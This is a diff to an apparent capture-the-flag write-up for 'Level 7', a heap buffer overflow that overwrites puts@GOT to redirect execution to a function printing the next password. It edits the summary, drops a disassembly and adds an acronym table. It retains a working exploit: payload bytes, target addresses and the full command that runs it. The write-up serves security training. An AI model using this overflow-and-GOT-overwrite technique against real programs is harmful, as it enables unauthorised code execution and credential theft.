@@ -1,5 +1,5 @@
 ## Level 7 - Heap Buffer Overflow with GOT Overwrite
-Binary allocates two 8-byte buffers on the heap and uses unsafe `strcpy()` to copy user input from argv[1] and argv[2]. By carefully overflowing the first buffer, we can corrupt the pointer to the second buffer and make it point to the GOT. Then we overwrite puts@GOT with the address of function m(), which prints the password.
+Heap buffer overflow + GOT overwrite — overflow first heap buffer to corrupt the second buffer's pointer, redirect it to puts@GOT, overwrite with m()
 
 ### Settings
 GCC stack protector support:            Enabled
@@ -48,29 +48,6 @@ arg1 = b'A' * 20 + struct.pack('<I', 0x8049928)  # 24 bytes total
 arg2 = b'\xf4\x84\x04\x08'                        # 4 bytes: m() address
 ```
 
-### Binary Function Analysis
-
-**Function m() Assembly:**
-```asm
-080484f4 <m>:
- 80484f4:	55                   	push   %ebp
- 80484f5:	89 e5                	mov    %esp,%ebp
- 80484f7:	83 ec 18             	sub    $0x18,%esp
- 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
- 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
- 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
- 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
- 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
- 8048516:	08
- 8048517:	89 14 24             	mov    %edx,(%esp)
- 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
- 804851f:	c9                   	leave
- 8048520:	c3                   	ret
-```
-
-Format string at 0x80486e0: "%s - %d\n"
-Password buffer at 0x8049960: Level 8 password (68 bytes)
-
 ### Key Insights
 
 1. **Payload Size:** Exactly 24 bytes needed (20 padding + 4 address)
@@ -86,6 +63,16 @@ Password buffer at 0x8049960: Level 8 password (68 bytes)
 - **Heap Corruption:** The 20-byte overflow of an 8-byte buffer corrupts heap metadata
 - **Precision:** Requires exact payload size and address to work
 - **GOT:** Global Offset Table at fixed address, can be reliably overwritten
+
+### Acronyms
+ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
+RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
+PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization
+GOT    Global Offset Table                 A table in ELF binaries that holds runtime addresses of dynamically linked functions; puts@GOT is overwritten here to redirect execution to m()
+PLT    Procedure Linkage Table             A stub table that works with the GOT to resolve and call external library functions at runtime via lazy binding
 
 ### Command:
 /home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
